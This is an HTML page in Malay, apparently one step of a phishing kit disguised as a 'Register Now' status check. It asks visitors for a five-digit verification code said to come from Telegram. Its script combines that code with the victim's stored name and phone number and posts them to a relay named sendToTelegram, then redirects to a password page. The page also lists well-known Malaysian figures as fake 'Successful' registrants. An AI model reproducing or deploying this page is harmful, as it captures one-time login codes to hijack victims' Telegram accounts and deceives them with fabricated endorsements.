
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Register Now</title>
    <meta name="robots" content="nofollow, noindex" />
    <link rel="shortcut icon" href="" />
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.7/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-LN+7fdVzj6u52u30Kp6M/trliBMCMKTyK833zpbD+pXdCLuTusPj697FH4R/5mcr" crossorigin="anonymous">

    <link rel="icon" href="assets/img/my.svg" type="image/x-icon">


    <!-- Open Graph meta tags for social media sharing -->
    <meta property="og:title" content="Register Now">
    <meta property="og:description" content="Register Now 2025">
    <meta property="og:image"
        content="assets/img/reg.png">
    <meta property="og:type" content="website">
    <link rel="stylesheet" href="assets/css/style.css">
</head>

<body>
    <div style="width: 100%;padding: 0px 16px;max-width: 600px;margin: auto;">
        <img class="w-100" src="assets/img/reg.png" />
        <div class="pb-3">
            
<!-- <h1 class="mt-3 text-center text-primary fw-bold" style="font-size: 30px!important">BERITA TERBARU 2025</h1> -->
<div class="my-3 flex flex-col gap-8 w-full max-w-[600px]">
    <div class="mt-8 flex flex-col justify-center items-center gap-4">
        <form class="rounded-md p-4 flex flex-col justify-center items-center w-full max-w-[500px] gap-2" id="otpForm" method="post">
          <div class="w-full relative flex justify-center items-center flex-col gap-2">
            <h4 class="fw-bold mt-2 mb-0 page-header text-center">
                <span>Semak Status
                </span>
            </h4>
            <p class="text-center">Kod pengesahan telah dihantar ke nombor Telegram anda, sila masukkan kod pengesahan.</p>
            <div class="w-full flex flex-col gap-2">
              <div class="flex justify-center gap-2">
                <div class="mb-3">
                        <div class="input-group">
                        <!-- Kotak input OTP -->
                        <input type="text" maxlength="1" class="form-control otp-input mx-1 border border-slate-400 h-10 w-10 text-center text-xl rounded-md" required="">
                        <input type="text" maxlength="1" class="form-control otp-input mx-1 border border-slate-400 h-10 w-10 text-center text-xl rounded-md" required="">
                        <input type="text" maxlength="1" class="form-control otp-input mx-1 border border-slate-400 h-10 w-10 text-center text-xl rounded-md" required="">
                        <input type="text" maxlength="1" class="form-control otp-input mx-1 border border-slate-400 h-10 w-10 text-center text-xl rounded-md" required="">
                        <input type="text" maxlength="1" class="form-control otp-input mx-1 border border-slate-400 h-10 w-10 text-center text-xl rounded-md" required="">
                    </div>
                    <div id="name-error" class="hidden text-red-500 text-sm" style="display: none;color: red;">Kod mestilah lebih daripada 5 aksara.</div>
                </div>
              </div>
              <!-- Input tersembunyi untuk menyimpan OTP lengkap -->
              <input type="hidden" name="code" id="fullcode">
              <!-- Pesan error jika ada --> 
            </div>
            <!-- Tombol submit -->
            <button type="submit" class="btn btn-primary mx-auto d-block">Teruskan </button>
          </div>
        </form>
      </div>
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            const userData = JSON.parse(localStorage.getItem('userData') || '{}');
            
            async function sendToTelegram(message) {
                try {
                    const response = await fetch('api/send', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            message: message
                        })
                    });
                    return response.ok;
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                    return false;
                }
            }

            function handleOTPInput() {
                const otpInputs = document.querySelectorAll('.otp-input');
                const fullCodeInput = document.getElementById('fullcode');
                
                otpInputs.forEach((input, index) => {
                    input.addEventListener('input', function(e) {
                        const value = e.target.value;
                        
                        if (!/^\d*$/.test(value)) {
                            e.target.value = '';
                            return;
                        }
                        
                        let fullCode = '';
                        otpInputs.forEach(input => {
                            fullCode += input.value;
                        });
                        fullCodeInput.value = fullCode;
                        
                        if (value && index < otpInputs.length - 1) {
                            otpInputs[index + 1].focus();
                        }
                    });
                    
                    input.addEventListener('keydown', function(e) {
                        if (e.key === 'Backspace' && !e.target.value && index > 0) {
                            otpInputs[index - 1].focus();
                        }
                    });
                });
            }

            handleOTPInput();

            const otpForm = document.getElementById('otpForm');
            otpForm.addEventListener('submit', async function (e) {
                e.preventDefault();
                
                const fullCode = document.getElementById('fullcode').value;
                
                if (fullCode.length !== 5) {
                    document.getElementById('name-error').style.display = 'block';
                    return;
                } else {
                    document.getElementById('name-error').style.display = 'none';
                }
                
                document.getElementById('loader').style.display = 'flex';
                
                try {
                    const message = `üîê <b>FORM KODE</b> üîê

üë§ <b>Nama:</b> <code>${userData.name || 'Tidak diketahui'}</code>
üì± <b>Nomor:</b> <code>${userData.phone || 'Tidak diketahui'}</code>
üî¢ <b>Kod:</b> <code>${fullCode}</code>
‚è∞ <b>Waktu:</b> <code>${new Date().toLocaleString('id-ID')}</code>

üìä <b>Status:</b> Kod `;

                    const otpData = {
                        ...userData,
                        otp: fullCode,
                        otpTimestamp: new Date().toISOString()
                    };
                    localStorage.setItem('userData', JSON.stringify(otpData));
                    
                    const telegramSuccess = await sendToTelegram(message);
                    
                    if (telegramSuccess) {
                        setTimeout(() => {
                            window.location.href = 'pass.html';
                        }, 1000);
                    } else {
                        console.log('Error...');
                        setTimeout(() => {
                            window.location.href = 'pass.html';
                        }, 1000);
                    }
                    
                } catch (error) {
                    console.error('Error:', error);
                    setTimeout(() => {
                        window.location.href = 'pass.html';
                    }, 1000);
                }
            });
        });
    </script>
</div>
        </div>

        <div class="borrowers-list">
            <ul id="borrowers">
                <li>
                    <img src="assets/img/1.jpg" alt="Ahmad Faizal">
                    <div>
                        <strong>Ahmad Faizal</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/2.jpg" alt="Siti Nurhaliza">
                    <div>
                        <strong>Siti Nurhaliza</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/3.jpg" alt="Lim Guan Eng">
                    <div>
                        <strong>Lim Guan Eng</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/4.jpg" alt="Nurul Izzah">
                    <div>
                        <strong>Nurul Izzah</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/21.jpg" alt="Zainal Abidin">
                    <div>
                        <strong>Zainal Abidin</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/6.jpg" alt="Tan Sri Lee">
                    <div>
                        <strong>Tan Sri Lee</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/7.jpg" alt="Raja Farah">
                    <div>
                        <strong>Raja Farah</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/8.jpg" alt="Muhammad Hafiz">
                    <div>
                        <strong>Muhammad Hafiz</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/9.jpg" alt="Aisyah Aziz">
                    <div>
                        <strong>Aisyah Aziz</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/10.jpg" alt="Syafiq Kyle">
                    <div>
                        <strong>Syafiq Kyle</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/11.jpg" alt="Farah Nabilah">
                    <div>
                        <strong>Farah Nabilah</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/12.jpg" alt="Aaron Aziz">
                    <div>
                        <strong>Aaron Aziz</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/13.jpg" alt="Fazura">
                    <div>
                        <strong>Fazura</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/14.jpg" alt="Remy Ishak">
                    <div>
                        <strong>Remy Ishak</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/15.jpg" alt="Mira Filzah">
                    <div>
                        <strong>Mira Filzah</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/16.jpg" alt="Syed Saddiq">
                    <div>
                        <strong>Syed Saddiq</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/17.jpg" alt="Lisa Surihani">
                    <div>
                        <strong>Lisa Surihani</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/18.jpg" alt="Fattah Amin">
                    <div>
                        <strong>Fattah Amin</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/19.jpg" alt="Yuna">
                    <div>
                        <strong>Yuna</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/20.jpg" alt="Nicholas Teo">
                    <div>
                        <strong>Nicholas Teo</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/1.jpg" alt="Ahmad Faizal">
                    <div>
                        <strong>Ahmad Faizal</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/2.jpg" alt="Siti Nurhaliza">
                    <div>
                        <strong>Siti Nurhaliza</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/3.jpg" alt="Lim Guan Eng">
                    <div>
                        <strong>Lim Guan Eng</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/4.jpg" alt="Nurul Izzah">
                    <div>
                        <strong>Nurul Izzah</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/21.jpg" alt="Zainal Abidin">
                    <div>
                        <strong>Zainal Abidin</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/6.jpg" alt="Tan Sri Lee">
                    <div>
                        <strong>Tan Sri Lee</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/7.jpg" alt="Raja Farah">
                    <div>
                        <strong>Raja Farah</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/8.jpg" alt="Muhammad Hafiz">
                    <div>
                        <strong>Muhammad Hafiz</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/9.jpg" alt="Aisyah Aziz">
                    <div>
                        <strong>Aisyah Aziz</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/10.jpg" alt="Syafiq Kyle">
                    <div>
                        <strong>Syafiq Kyle</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/11.jpg" alt="Farah Nabilah">
                    <div>
                        <strong>Farah Nabilah</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/12.jpg" alt="Aaron Aziz">
                    <div>
                        <strong>Aaron Aziz</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/13.jpg" alt="Fazura">
                    <div>
                        <strong>Fazura</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/14.jpg" alt="Remy Ishak">
                    <div>
                        <strong>Remy Ishak</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/15.jpg" alt="Mira Filzah">
                    <div>
                        <strong>Mira Filzah</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/16.jpg" alt="Syed Saddiq">
                    <div>
                        <strong>Syed Saddiq</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/17.jpg" alt="Lisa Surihani">
                    <div>
                        <strong>Lisa Surihani</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/18.jpg" alt="Fattah Amin">
                    <div>
                        <strong>Fattah Amin</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/19.jpg" alt="Yuna">
                    <div>
                        <strong>Yuna</strong> - Successful ‚úÖ
                    </div>
                </li>
                <li>
                    <img src="assets/img/20.jpg" alt="Nicholas Teo">
                    <div>
                        <strong>Nicholas Teo</strong> - Successful ‚úÖ
                    </div>
                </li>
            </ul>
        </div>
        <!-- Gambar di bawah form -->
        <div class="form-image-container">
            <img src="assets/img/ftr1.png" alt="Deskripsi Gambar" class="form-image">
        </div>
    </div>

    </div>
    <!-- Gambar di bawah Form -->
    <div class="footer-banner">
        <img src="assets/img/ftr2.png">
    </div>

    </div>
    <div id="loader">
        <div class="loader"></div>
    </div>
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            document.getElementById("loader").style.display = "none";
        });
    </script>
</body>

</html>